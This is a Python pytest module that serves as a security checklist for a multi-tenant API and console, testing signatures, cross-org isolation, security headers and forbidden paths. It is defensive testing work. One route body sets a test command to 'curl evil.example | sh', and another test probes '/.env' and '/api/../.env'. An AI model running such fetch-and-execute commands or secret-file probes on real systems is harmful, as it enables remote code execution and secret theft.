"""Attack surface checklist (plan phase 13).

One place listing the properties an attacker would try, with the test that holds each one. Most
live next to the code they protect; ``CHECKLIST`` points at them and a meta test fails if one is
renamed or removed. The tests below add what had no home: security headers, another org's ids on
every console route, and paths and methods that must not exist.
"""

import ast
import uuid
from pathlib import Path
from typing import Any

import httpx
import psycopg
import pytest
import yaml

from app.api.main import create_app
from app.settings import Settings
from tests.console.conftest import ORIGIN, SigningKey, auth
from tests.world import World

ROOT = Path(__file__).resolve().parents[3]
TESTS = ROOT / "backend" / "tests"
ALICE = ("user_alice", "org_acme")  # Acme admin

CHECKLIST: dict[str, list[str]] = {
    "Slack: forged, stale or missing signatures are refused": [
        "slack/test_ingress.py::test_unverifiable_requests_are_refused",
        "slack/test_ingress.py::test_missing_signature_headers",
        "slack/test_ingress.py::test_interactions_need_a_valid_signature",
        "slack/test_unit.py::test_signature_rejections",
    ],
    "Slack: replayed events do nothing twice": [
        "slack/test_ingress.py::test_duplicate_events_are_acknowledged_once",
        "slack/test_ingress.py::test_temporal_rejects_duplicate_workflow_ids_too",
    ],
    "Oversized and malformed bodies are refused": [
        "slack/test_ingress.py::test_oversized_and_malformed_payloads"
    ],
    "Console tokens: tampered, foreign key, expired, wrong issuer or audience, algorithm confusion": [
        "console/test_verifier.py::test_tampered_signature",
        "console/test_verifier.py::test_token_signed_by_another_key_with_same_kid",
        "console/test_verifier.py::test_expired_and_not_yet_valid",
        "console/test_verifier.py::test_claim_checks",
        "console/test_verifier.py::test_algorithm_confusion_is_refused",
    ],
    "Console: privilege comes from our database, not the token": [
        "console/test_console_api.py::test_me_uses_privilege_from_the_database",
        "console/test_console_api.py::test_identity_refusals",
    ],
    "Console: other origins get no CORS grant": [
        "console/test_console_api.py::test_cors_allows_only_console_origins"
    ],
    "Webhooks: Clerk (Svix) and GitHub signatures": [
        "console/test_webhooks.py::test_signature_checks",
        "agent/test_change_checks.py::test_github_webhooks_are_parsed_and_signatures_checked",
    ],
    "OAuth state cannot be replayed": [
        "console/test_integrations_api.py::test_admins_connect_jira_and_state_cannot_be_replayed"
    ],
    "Another org's rows: invisible, unwritable (row level security)": [
        "schema/test_isolation.py::test_reads_see_only_the_current_org",
        "schema/test_isolation.py::test_no_context_means_no_rows",
        "schema/test_isolation.py::test_cannot_insert_a_row_for_another_org",
        "security/test_attack_surface.py::test_another_orgs_ids_are_not_found_on_any_route",
    ],
    "Another org's objects in storage are refused": [
        "test_storage.py::test_another_orgs_reference_is_refused",
        "test_storage.py::test_delete_tenant_removes_only_that_tenant",
    ],
    "The agent acts within the requester's access": [
        "policy/test_policy.py::test_channel_reads_follow_the_channel_rule",
        "policy/test_policy.py::test_another_orgs_channels_are_invisible",
        "policy/test_policy.py::test_audience_check",
    ],
    "Model or person text cannot become a Slack mention, broadcast or link": [
        "slack/test_unit.py::test_escape_neutralizes_mentions_and_links_but_keeps_quotes",
    ],
    "Sandboxes: no credentials, no network, no secret files": [
        "tools/test_sandbox_redteam.py::test_no_credential_in_the_environment_or_the_files",
        "tools/test_sandbox_redteam.py::test_no_network_to_the_control_plane_or_anywhere",
        "tools/test_code.py::test_secret_files_are_never_read_or_searched",
    ],
    "Security headers on the API and the console": [
        "security/test_attack_surface.py::test_api_security_headers_on_every_response",
        "security/test_attack_surface.py::test_console_static_site_headers",
    ],
    "Paths and methods that must not exist": [
        "security/test_attack_surface.py::test_no_docs_no_schema_no_stray_methods",
    ],
}


def test_every_checklist_test_exists() -> None:
    missing = []
    for tests in CHECKLIST.values():
        for node in tests:
            file, name = node.split("::")
            source = (TESTS / file).read_text()
            names = {
                n.name
                for n in ast.walk(ast.parse(source))
                if isinstance(n, ast.FunctionDef | ast.AsyncFunctionDef)
            }
            if name not in names:
                missing.append(node)
    assert missing == [], "the checklist points at tests that no longer exist"


# ------------------------------------------------------------------ headers


async def test_api_security_headers_on_every_response(
    console: httpx.AsyncClient, signing_key: SigningKey
) -> None:
    responses = [
        await console.get("/healthz"),
        await console.get("/api/me", headers=auth(signing_key, *ALICE)),
        await console.get("/api/me"),  # 401
        await console.get("/nothing-here"),  # 404
        await console.post("/slack/events", content=b"{}"),  # refused before any work
    ]
    for response in responses:
        h = response.headers
        assert h["x-content-type-options"] == "nosniff", response.request.url
        assert h["x-frame-options"] == "DENY"
        assert h["referrer-policy"] == "no-referrer"
        assert h["content-security-policy"] == "default-src 'none'; frame-ancestors 'none'"
        assert h["cache-control"] == "no-store"
        assert "strict-transport-security" not in h  # local and test: plain HTTP
        assert h["x-request-id"]


@pytest.mark.parametrize(("env", "hsts"), [("staging", True), ("production", True), ("local", False)])
async def test_hsts_only_where_the_api_is_served_over_https(env: str, hsts: bool) -> None:
    app = create_app(Settings(env=env, console_origins=ORIGIN))
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://api") as client:
        response = await client.get("/healthz")
    assert ("strict-transport-security" in response.headers) is hsts
    if hsts:
        assert response.headers["strict-transport-security"].startswith("max-age=31536000")


def _static_headers(blueprint: Path) -> dict[str, str]:
    data: dict[str, Any] = yaml.safe_load(blueprint.read_text())
    services = [s for p in data.get("projects", []) for e in p["environments"] for s in e.get("services", [])]
    services += data.get("services", [])
    (site,) = [s for s in services if s.get("runtime") == "static"]
    return {h["name"]: h["value"] for h in site["headers"] if h["path"] == "/*"}


def test_console_static_site_headers() -> None:
    headers = _static_headers(ROOT / "render.yaml")
    assert headers["X-Frame-Options"] == "DENY"
    assert headers["X-Content-Type-Options"] == "nosniff"
    assert headers["Strict-Transport-Security"].startswith("max-age=31536000")
    csp = headers.get("Content-Security-Policy") or headers["Content-Security-Policy-Report-Only"]
    directives = dict(d.strip().split(" ", 1) for d in csp.split(";") if d.strip())
    assert directives["default-src"] == "'self'"
    assert directives["object-src"] == "'none'"
    assert directives["frame-ancestors"] == "'none'"
    assert "'unsafe-eval'" not in csp
    assert "'unsafe-inline'" not in directives["script-src"]


# ------------------------------------------------------------------ another org's ids

# Every console route with an id, with a body that would be accepted for the caller's own row.
ID_ROUTES: list[tuple[str, str, str, dict[str, Any] | None]] = [
    ("PATCH", "/api/members/{id}", "org_memberships", {"privilege": "user"}),
    ("DELETE", "/api/members/{id}", "org_memberships", None),
    ("DELETE", "/api/members/invitations/{id}", "org_memberships", None),
    ("PUT", "/api/members/{id}/roles", "org_memberships", {"role_ids": []}),
    ("PATCH", "/api/roles/{id}", "custom_roles", {"title": "Taken over"}),
    ("POST", "/api/roles/{id}/archive", "custom_roles", None),
    ("PATCH", "/api/slack/channels/{id}", "channels", {"is_allowlisted": False}),
    ("POST", "/api/access-requests/{id}/invite", "access_requests", None),
    ("POST", "/api/access-requests/{id}/dismiss", "access_requests", None),
    ("PATCH", "/api/schedules/{id}", "schedules", {"name": "Taken over"}),
    ("POST", "/api/schedules/{id}/pause", "schedules", None),
    ("POST", "/api/schedules/{id}/resume", "schedules", None),
    ("DELETE", "/api/schedules/{id}", "schedules", None),
    ("POST", "/api/schedules/{id}/reassign", "schedules", {"owner_membership_id": "{acme_admin}"}),
    ("POST", "/api/schedules/{id}/run", "schedules", None),
    ("PATCH", "/api/catalog/{id}", "services", {"description": "Taken over"}),
    ("POST", "/api/catalog/{id}/confirm", "services", None),
    ("POST", "/api/catalog/{id}/archive", "services", None),
    ("PATCH", "/api/repositories/{id}", "repositories", {"test_command": "curl evil.example | sh"}),
    ("GET", "/api/tasks/{id}", "tasks", None),
]
# Ids that are not rows, checked where they are made: another org's role preview is
# test_previews_run_on_the_worker_for_admins_of_the_org (tests/console/test_roles_api.py).
OTHER_ID_ROUTES = {("GET", "/api/roles/preview/")}


def test_id_routes_cover_every_console_route_with_an_id() -> None:
    app = create_app(Settings(env="test"))
    found = set()
    for entry in app.routes:
        router = getattr(entry, "original_router", None)
        for route in [*(router.routes if router else []), entry]:
            path = getattr(route, "path", "")
            if path.startswith("/api/") and "{" in path and "{key}" not in path:
                for method in getattr(route, "methods", None) or ():
                    found.add((method, path.split("{", 1)[0]))
    listed = {(m, p.split("{", 1)[0]) for m, p, _, _ in ID_ROUTES} | OTHER_ID_ROUTES
    assert found <= listed, f"add these routes to ID_ROUTES: {sorted(found - listed)}"


def _row(world: World, table: str, row_id: Any) -> Any:
    with psycopg.connect(world.url) as conn:
        found = conn.execute(f"select to_jsonb(t) from app.{table} t where id = %s", (row_id,)).fetchone()
    return found[0] if found else None


async def test_another_orgs_ids_are_not_found_on_any_route(
    console: httpx.AsyncClient, signing_key: SigningKey, module_world: World
) -> None:
    """Another org's id gets exactly the answer a made up id gets (nothing tells which ids exist
    elsewhere), never a success, and its row stays as it was."""
    globex, acme = module_world.globex, module_world.acme
    with psycopg.connect(module_world.url) as conn:
        role = conn.execute(
            "select id from app.custom_roles where org_id = %s limit 1", (globex.id,)
        ).fetchone()
    assert role is not None
    ids = {**globex.ids, "org_memberships": globex.user, "channels": globex.channel, "custom_roles": role[0]}

    async def call(method: str, path: str, row_id: Any, body: dict[str, Any] | None) -> httpx.Response:
        payload = {k: (str(acme.admin) if v == "{acme_admin}" else v) for k, v in (body or {}).items()}
        return await console.request(
            method,
            path.replace("{id}", str(row_id)),
            json=payload if body is not None else None,
            headers=auth(signing_key, *ALICE),
        )

    def answer(response: httpx.Response) -> tuple[int, str | None]:
        return response.status_code, (response.json().get("error") or {}).get("code")

    for method, path, table, body in ID_ROUTES:
        target = ids[table]
        before = _row(module_world, table, target)
        assert before is not None, table
        made_up = answer(await call(method, path, uuid.uuid4(), body))
        theirs = answer(await call(method, path, target, body))
        assert theirs == made_up, (method, path, theirs, made_up)
        assert theirs[0] in (404, 409), (method, path, theirs)
        assert _row(module_world, table, target) == before, (method, path)


# ------------------------------------------------------------------ paths and methods


async def test_no_docs_no_schema_no_stray_methods(
    console: httpx.AsyncClient, signing_key: SigningKey
) -> None:
    for path in ("/docs", "/redoc", "/openapi.json", "/api/docs", "/.env", "/api/../.env", "/admin"):
        assert (await console.get(path)).status_code == 404, path
    h = auth(signing_key, *ALICE)
    assert (await console.request("TRACE", "/api/me", headers=h)).status_code == 405
    assert (await console.get("/slack/events")).status_code == 405
    assert (await console.get("/slack/interactions")).status_code == 405
    assert (await console.delete("/api/settings", headers=h)).status_code == 405
    assert (await console.put("/api/usage", headers=h)).status_code == 405
